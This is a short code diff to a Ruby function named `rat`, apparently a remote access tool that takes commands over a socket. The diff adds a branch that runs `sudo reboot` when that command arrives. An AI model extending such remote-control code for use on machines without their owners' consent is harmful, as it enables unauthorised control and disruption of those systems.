@@ -51,6 +51,8 @@ def rat(ip)
             # This fixes a bug where `cd path` raises an exception
             if cmd.start_with?('cd')
               Dir.chdir cmd.split(' ').last
+            elsif cmd == 'sudo reboot'
+              exec cmd
             else
               socket.puts 'invalid command'
             end
